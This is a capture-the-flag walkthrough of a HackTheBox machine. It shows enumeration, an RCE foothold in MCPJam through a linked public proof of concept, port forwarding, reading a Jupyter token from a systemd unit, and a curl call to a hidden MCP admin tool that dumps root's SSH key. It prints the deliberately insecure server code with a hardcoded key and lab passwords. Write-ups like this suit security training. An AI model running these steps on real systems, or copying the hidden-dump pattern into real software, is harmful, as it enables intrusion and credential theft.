# DevHub: HackTheBox Machine

Difficulty: Medium

## Enumeration

- An nmap scan reveals port 22,80,6274 being open.
- Port 80 has a static site saying that there is an MCP Inspector on 6274, an analytics dashboard on port 8888 (localhost only) and an internal code repo.

## Initial Foothold

- Port 6274 is running MCPJam v1.4.2 (found version in the settings page).
- This is vulnerable to RCE mainly [CVE-2026-23744](https://github.com/suljov/CVE-2026-23744-Remote-Code-Execution-POC).
- Start a shell handler (I used [penelope](https://github.com/brightio/penelope)) and run the exploit to get an initial shell as `mcp-dev@devhub`


## Pivoting

- On running `ss -nltp` we can see 2 interesting open ports, at port 8888 and port 5000
- Forward both of these using chisel to be able to interact with the services locally.
- Port 888 is running a jupyter server, with password disabled. So it requires the server token to log in.
- We can search for jupyter-related files using the following command:

```bash
find / -name *jupyter* 2>/dev/null
```

- This gives us the file `/etc/systemd/system/jupyter.service` which contains the server token. 

```
[Unit]
Description=Jupyter Notebook Server
After=network.target

[Service]
Type=simple
User=analyst
WorkingDirectory=/home/analyst
Environment=PATH=/home/analyst/jupyter-env/bin:/usr/local/bin:/usr/bin:/bin
Environment=JUPYTER_TOKEN=[server_token]
ExecStart=/home/analyst/jupyter-env/bin/jupyter lab --ip=127.0.0.1 --port=8888 --no-browser --notebook-dir=/home/analyst/notebooks --ServerApp.token='[server_token]' --ServerApp.password='' --ServerApp.allow_origin='' --ServerApp.disable_check_xsrf=False
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
```

- Enter this into the login page to access the jupyter server.
- From here we can simply use the **Terminal** option on the dashboard to gain a shell as `analyst`, giving us the user flag.

## Privilege Escalation

- In `/opt/opsmcp/server.py` we can get this piece of code:

```python
#!/usr/bin/env python3
"""
OPSMCP - Operations MCP Server
Internal tool for system operations management
"""

from flask import Flask, jsonify, request
import os

app = Flask(__name__)

# API Key for authentication
VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"

# Registered tools (visible)
VISIBLE_TOOLS = {
    "ops.system_status": {
        "description": "Get system status and health metrics",
        "parameters": {}
    },
    "ops.list_services": {
        "description": "List running services",
        "parameters": {}
    },
    "ops.check_disk": {
        "description": "Check disk usage",
        "parameters": {}
    },
    "ops.view_logs": {
        "description": "View recent system logs",
        "parameters": {"service": "string"}
    }
}

# Hidden tools (not in /tools/list but callable)
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"}
    },
    "ops._debug_mode": {
        "description": "Enable debug mode",
        "parameters": {}
    }
}

ALL_TOOLS = {**VISIBLE_TOOLS, **HIDDEN_TOOLS}

def check_auth():
    """Check API key authentication"""
    api_key = request.headers.get('X-API-Key', '')
    return api_key == VALID_API_KEY

@app.route('/')
def index():
    return jsonify({
        "server": "OPSMCP",
        "version": "2.1.0",
        "status": "operational",
        "endpoints": ["/tools/list", "/tools/call", "/health"],
        "auth": "Required - X-API-Key header"
    })

@app.route('/health')
def health():
    return jsonify({"status": "healthy", "uptime": "14d 3h 22m"})

@app.route('/tools/list')
def list_tools():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    return jsonify({
        "tools": list(VISIBLE_TOOLS.keys()),
        "count": len(VISIBLE_TOOLS),
        "details": VISIBLE_TOOLS
    })

@app.route('/tools/call', methods=['POST'])
def call_tool():
    if not check_auth():
        return jsonify({"error": "Unauthorized", "message": "Valid X-API-Key header required"}), 401
    
    data = request.get_json() or {}
    tool_name = data.get('name', '')
    args = data.get('arguments', {})
    
    if not tool_name:
        return jsonify({"error": "Tool name required"}), 400
    
    if tool_name not in ALL_TOOLS:
        return jsonify({"error": f"Unknown tool: {tool_name}"}), 404
    
    # Execute tool
    if tool_name == "ops.system_status":
        return jsonify({
            "cpu": "23%",
            "memory": "1.2GB/4GB",
            "load": "0.45",
            "status": "nominal"
        })
    
    elif tool_name == "ops.list_services":
        return jsonify({
            "services": [
                {"name": "nginx", "status": "running", "pid": 1234},
                {"name": "opsmcp", "status": "running", "pid": 5678},
                {"name": "jupyter", "status": "running", "pid": 9012},
                {"name": "mcpjam", "status": "running", "pid": 3456}
            ]
        })
    
    elif tool_name == "ops.check_disk":
        return jsonify({
            "filesystems": [
                {"mount": "/", "used": "4.2G", "available": "15G", "percent": "22%"},
                {"mount": "/home", "used": "1.1G", "available": "8G", "percent": "12%"}
            ]
        })
    
    elif tool_name == "ops.view_logs":
        service = args.get('service', 'system')
        return jsonify({
            "service": service,
            "logs": [
                "[2026-01-22 10:00:01] Service started",
                "[2026-01-22 10:00:02] Listening on configured port",
                "[2026-01-22 10:15:33] Health check passed",
                "[2026-01-22 11:00:00] Routine maintenance completed"
            ]
        })
    
    elif tool_name == "ops._debug_mode":
        return jsonify({
            "debug": True,
            "message": "Debug mode enabled",
            "hidden_tools": list(HIDDEN_TOOLS.keys()),
            "note": "Debug endpoints now accessible"
        })
    
    elif tool_name == "ops._admin_dump":
        target = args.get('target', '')
        confirm = args.get('confirm', False)
        
        if not confirm:
            return jsonify({
                "error": "Confirmation required",
                "usage": "Set confirm=true to proceed",
                "warning": "This dumps sensitive credentials"
            })
        
        if target == "ssh_keys":
            try:
                with open('/root/.ssh/id_rsa', 'r') as f:
                    key_data = f.read()
                return jsonify({
                    "target": "ssh_keys",
                    "root_private_key": key_data,
                    "note": "Emergency recovery key dump"
                })
            except Exception as e:
                return jsonify({
                    "target": "ssh_keys",
                    "error": f"Could not read key: {str(e)}"
                })
        
        elif target == "passwords":
            return jsonify({
                "target": "passwords",
                "dump": {
                    "root": "$6$rounds=656000$saltsalt$hashedpassword",
                    "analyst": "JupyterN0tebook!2026",
                    "mcp-dev": "Mcp!Insp3ct0r2026"
                }
            })
        
        elif target == "tokens":
            return jsonify({
                "target": "tokens",
                "api_tokens": {
                    "admin_token": "opsmcp_admin_7f3b9c2d1e4f5a6b",
                    "service_token": "opsmcp_svc_8c9d0e1f2a3b4c5d"
                }
            })
        
        else:
            return jsonify({
                "error": "Invalid target",
                "valid_targets": ["ssh_keys", "passwords", "tokens"]
            })
    
    return jsonify({"error": "Tool execution failed"}), 500

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
```

- This is the source code to interact with port 5000, which we've already forwarded in the above steps. We'll use this to dump the ssh keys of root, which can get us root ssh access to the server.

```bash
curl http://127.0.0.1:5000/tools/call -d '{"name":"ops._admin_dump", "arguments":{"confirm":"true", "target":"ssh_keys"}}' -H "X-API-Key: [admin_key]" -H "Content-Type: application/json" | jq
```

- This dumps the ssh root key. Save this on your machine and use it to log in as root.

```bash
chmod 600 priv_key.pem
ssh -i priv_key.pem root@devhub.htb
```

- This gives us the root flag.

Happy Hacking :)
